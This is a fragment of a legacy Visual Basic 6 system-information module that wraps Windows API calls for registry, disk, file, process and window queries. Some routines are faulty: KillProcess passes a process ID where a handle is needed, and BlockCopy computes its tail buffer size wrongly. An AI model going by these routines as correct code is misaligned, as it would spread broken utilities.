        sOwner$ = GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner")
        sCompany$ = GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization")
        sLicense$ = GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion", "ProductKey")
        GetLicense% = 1
    ElseIf OS_VERSION.dwPlatformId = 2 Then
        sOwner$ = GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion", "RegisteredOwner")
        sCompany$ = GetSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion", "RegisteredOrganization")
        sLicense$ = "modSysInfo::GetLicense unsupported on " & sVersion$
        GetLicense% = 2
    End If
End Function

Public Function GetHardDiskSerial(Optional sDrive As String) As Long
    Dim lNumber As Long, sBuffer As String * MAX_FILENAME_LEN
    If sDrive$ = "" Then sDrive$ = "C"
    Call GetVolumeInformation(sDrive$ & ":\", sBuffer$, MAX_FILENAME_LEN, lNumber&, 0&, 0&, sBuffer$, MAX_FILENAME_LEN)
    GetHardDiskSerial& = lNumber&
End Function

Public Function BlockCopy(sFileOrig As String, sFileNew As String) As Long
    On Error GoTo ErrTrap
    Dim bOrig(BLOCK_SIZE) As Byte, bNew() As Byte, nData As Integer
    Dim nOpenOrig As Integer, nOpenNew As Integer, nK As Integer
    Dim lStart As Long, lEnd As Long
    nOpenOrig% = FreeFile
    Open sFileOrig$ For Binary As #nOpenOrig%
        lStart& = 1
        lEnd& = LOF(nOpenOrig%)
        nData% = ((lEnd& - lStart&) Mod BLOCK_SIZE) - ((lEnd& - lStart&) \ BLOCK_SIZE)
        ReDim bNew(nData%)
        nOpenNew% = FreeFile
        Open sFileNew$ For Output As #nOpenNew%
        Close #nOpenNew%
        nOpenNew% = FreeFile
        Open sFileNew$ For Binary As #nOpenNew%
            Seek #nOpenOrig%, lStart&
            For nK% = 0 To ((lEnd& - lStart&) \ BLOCK_SIZE) - 1
                Get #nOpenOrig%, , bOrig()
                Put #nOpenNew%, , bOrig()
            Next nK%
            If ((lEnd& - lStart&) Mod BLOCK_SIZE) > 0 Then
                Get #nOpenOrig%, , bNew()
                Put #nOpenNew%, , bNew()
            End If
        Close #nOpenOrig%
    Close #nOpenNew%
    BlockCopy& = 1
Exit Function
ErrTrap:
    BlockCopy& = 0
End Function

Public Function FindFile(ByVal sStartPath As String, ByVal sFileMask As String) As String
    On Error GoTo ErrTrap
    Dim udtFindData As WIN32_FIND_DATA, hFileSearch As Long
    Dim sFileName As String, sFoundFiles As String
    sFoundFiles$ = vbNullString
    If FileExists(sStartPath$) Then
        If Right$(sStartPath$, 1) <> "\" Then sStartPath$ = sStartPath$ & "\"
        hFileSearch& = FindFirstFile(sStartPath$ & sFileMask$, udtFindData)
        If hFileSearch <> INVALID_HANDLE_VALUE Then
            Do
                DoEvents
                If InStr(udtFindData.cFileName, Chr$(0)) > 0 Then
                    sFileName$ = Left$(udtFindData.cFileName, InStr(udtFindData.cFileName, Chr$(0)) - 1)
                Else
                    sFileName$ = udtFindData.cFileName
                End If
                sFoundFiles$ = sFoundFiles$ & sFileName$
                If udtFindData.dwFileAttributes And vbDirectory Then sFoundFiles$ = sFoundFiles$ & "\"
                If FindNextFile(hFileSearch&, udtFindData) = API_FALSE Then
                    If Err.LastDllError = ERROR_NO_MORE_FILES Then
                        Call FindClose(hFileSearch&)
                        Exit Do
                    End If
                End If
                sFoundFiles$ = sFoundFiles$ & vbNewLine
            Loop
        Else
            GoTo ErrTrap
        End If
    Else
        GoTo ErrTrap
    End If
    FindFile$ = sFoundFiles$
Exit Function
ErrTrap:
    FindFile$ = vbNullString
End Function

Public Function FileExists(ByVal sFileName As String) As Integer
    On Error GoTo ErrTrap
    Dim hFile As Long, Win32FindData As WIN32_FIND_DATA
    sFileName$ = Trim$(sFileName$)
    hFile& = FindFirstFile(sFileName$, Win32FindData)
    If (hFile& <> INVALID_HANDLE_VALUE) And (hFile& <> ERROR_NO_MORE_FILES) Then
        FileExists% = 1
    ElseIf GetFileAttributes(sFileName$) <> (-1) Then
        FileExists% = 1
    End If
    Call FindClose(hFile&)
Exit Function
ErrTrap:
    FileExists% = 0
End Function

Private Function HighByte(nWord As Integer) As Byte
    Call CopyMemory(HighByte, VarPtr(nWord%) + 1, 1)
End Function

Private Function LowByte(nWord As Integer) As Byte
    Call CopyMemory(LowByte, nWord%, 1)
End Function

Public Function GetDiskFreeSpace(Optional sDrive As String) As String
    On Error GoTo ErrTrap
    Dim sAllDrives As String, lDriveCount As Long, lRet As Long
    Dim udtFreeBytesAvail As PULARGE_INTEGER, udtTtlBytes As PULARGE_INTEGER
    Dim udtTTlFree As PULARGE_INTEGER, dFreeSpace As Double
    Dim varDrives As Variant, varDrive As Variant, sTempRet As String
    sDrive$ = Trim$(sDrive$)
    sAllDrives$ = String(512, 0)
    lDriveCount& = Len(sAllDrives$)
    lRet& = GetLogicalDriveStrings(lDriveCount&, sAllDrives$)
    If lRet > lDriveCount& Then
       sAllDrives$ = String(lRet& + 1, 0)
       lDriveCount& = Len(sAllDrives$)
    ElseIf lRet = 0 Then
       GoTo ErrTrap
    End If
    sAllDrives$ = Left(sAllDrives$, lRet&)
    varDrives = Split(sAllDrives$, Chr(0))
    For Each varDrive In varDrives
        If Not (GetDriveType(varDrive) = DRIVE_REMOVABLE) Then
            If GetDiskFreeSpaceEx(varDrive, udtFreeBytesAvail, udtTtlBytes, udtTTlFree) Then
                If udtFreeBytesAvail.lLowByte < 0 Then
                    dFreeSpace# = udtFreeBytesAvail.lHighByte * 2 ^ 32 + udtFreeBytesAvail.lLowByte + 4294967296#
                Else
                    dFreeSpace# = udtFreeBytesAvail.lHighByte * 2 ^ 32 + udtFreeBytesAvail.lLowByte
                End If
                If sDrive$ <> "" Then
                    If sDrive$ = Trim$(Replace$(Replace$(varDrive, Chr$(0), ""), ":\", "")) Then
                        sTempRet$ = sTempRet$ & varDrive & " " & Format(dFreeSpace#, "#,###") & vbCrLf
                    End If
                Else
                    sTempRet$ = sTempRet$ & varDrive & " " & Format(dFreeSpace#, "#,###") & vbCrLf
                End If
            End If
        End If
    Next
    GetDiskFreeSpace$ = sTempRet$
Exit Function
ErrTrap:
    GetDiskFreeSpace$ = vbNullString
End Function

Public Function GetComputerName() As String
    On Error GoTo ErrTrap
    Dim sString As String
    sString$ = Space(512)
    GetComputerName$ = Trim$(GetComputerNameA(sString$, Len(sString$)))
Exit Function
ErrTrap:
    GetComputerName$ = vbNullString
End Function

Public Function GetUserName() As String
    On Error GoTo ErrTrap
    Dim sString As String
    sString$ = Space(512)
    GetUserName$ = Trim$(GetUserNameA(sString$, Len(sString$)))
Exit Function
ErrTrap:
    GetUserName$ = vbNullString
End Function

Public Function GetProcesses() As String
    On Error GoTo ErrTrap
    Dim hSnapShot As Long, udtPROCESSENTRY32 As PROCESSENTRY32, bRet As Boolean, sProcName As String
    Dim sTempProcess As String
    Call GetVersionEx
    If (OS_VERSION.dwMajorVersion = 4 Or OS_VERSION.dwMajorVersion = 3) And OS_VERSION.dwPlatformId = 2 Then
        GoTo ErrTrap
    Else
        hSnapShot& = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0&)
        udtPROCESSENTRY32.dwSize = Len(udtPROCESSENTRY32)
        bRet = Process32First(hSnapShot&, udtPROCESSENTRY32)
        Do While bRet = True
            sProcName$ = UCase$(Left$(udtPROCESSENTRY32.szExeFile, IIf(InStr(1, udtPROCESSENTRY32.szExeFile, Chr$(0)) > 0, InStr(1, udtPROCESSENTRY32.szExeFile, Chr$(0)) - 1, 0)))
            sTempProcess$ = sTempProcess$ & sProcName$ & " - " & udtPROCESSENTRY32.th32ProcessID & vbCrLf
            bRet = Process32Next(hSnapShot&, udtPROCESSENTRY32)
        Loop
        Call CloseHandle(hSnapShot&)
    End If
    GetProcesses$ = sTempProcess$
Exit Function
ErrTrap:
    GetProcesses$ = vbNullString
End Function

Public Function KillProcess(hPID As Long) As Long
    On Error GoTo ErrTrap
    KillProcess& = TerminateProcess(hPID&, 0&)
Exit Function
ErrTrap:
    KillProcess& = 0
End Function

Private Function LowWord(DWORD As Long) As Integer
    On Error GoTo ErrTrap
    If DWORD& And &H8000& Then
        LowWord% = &H8000 Or (DWORD& And &H7FFF&)
    Else
        LowWord% = DWORD& And &HFFFF&
    End If
Exit Function
ErrTrap:
    LowWord% = 0
End Function

Public Function GetWindowText(hWnd As Long) As String
    On Error GoTo ErrTrap
    Dim lK As Long, sName As String
    sName$ = Space(128)
    lK& = GetWindowTextA(hWnd&, sName$, 128)
    If lK& > 0 Then
        sName$ = Left$(sName$, lK&)
    Else
        sName$ = vbNullString
    End If
    GetWindowText$ = sName$
Exit Function
ErrTrap:
    GetWindowText$ = vbNullString
End Function

Private Function GetLanguageInfo(ByVal dwLocaleID As Long, ByVal dwLCType As Long) As String
    On Error GoTo ErrTrap
    Dim sReturn As String, lRet As Long
    sReturn$ = String(128, 0)
    lRet& = GetLocaleInfo(dwLocaleID&, dwLCType&, sReturn$, Len(sReturn$))
    If lRet& > 0 Then GetLanguageInfo$ = Left$(sReturn$, lRet& - 1)
Exit Function
ErrTrap:
    GetLanguageInfo$ = vbNullString
End Function
'
'/*
' * must go into a standard module and remove the RaiseEvent
' * find some other way to process messages
' * dont forget to CallWindowProc to pass message on
' */
'Public Function WndProc(ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
'    Dim sText As String, LocId As Long
'    If wMsg = System.RegMsg Then
'        Select Case wParam&
'            '/* lParam& = hWnd */
'            Case HSHELL_WINDOWCREATED
'                RaiseEvent WindowCreated(lParam&, GetWindowText(lParam&))
'            Case HSHELL_WINDOWDESTROYED
'                RaiseEvent WindowDestroyed(lParam&, GetWindowText(lParam&))
'            Case HSHELL_WINDOWACTIVATED
'                RaiseEvent WindowActivated(lParam&, GetWindowText(lParam&))
'            Case HSHELL_LANGUAGE
'                LocId = LowWord(GetKeyboardLayout(0&))
'                RaiseEvent LanguageChanged(GetLanguageInfo(LocId, LOCALE_SENGLANGUAGE))
'            Case HSHELL_GETMINRECT
'                RaiseEvent WindowRect
'            Case HSHELL_REDRAW
'                RaiseEvent WindowRedraw(lParam&, GetWindowText(lParam&))
'            Case HSHELL_TASKMAN
'                RaiseEvent ActivateTaskman
'            Case HSHELL_ACTIVATESHELLWINDOW
'                RaiseEvent ActivateShellWindow
'        End Select
'    Else
'        WndProc = CallWindowProc(System.OldProc, hWnd&, wMsg&, wParam&, lParam&)
'    End If
'End Function
'
'Public Function SetShellHook(hWnd As Long, lpHookType As RSH_HOOKTYPE) As Long
'    System.RegMsg& = RegisterWindowMessage(ByVal "SHELLHOOK")
'    Call RegisterShellHook(hWnd&, lpHookType)
'    System.OldProc& = GetWindowLong(hWnd&, GWL_WNDPROC)
'    Call SetWindowLong(hWnd&, GWL_WNDPROC, AddressOf WndProc)
'End Function
'
'Public Function ReleaseShellHook(hWnd As Long) As Long
'    Call RegisterShellHook(hWnd&, RSH_DEREGISTER)
'    Call SetWindowLong(hWnd&, GWL_WNDPROC, dwOldProc&)
'End Function
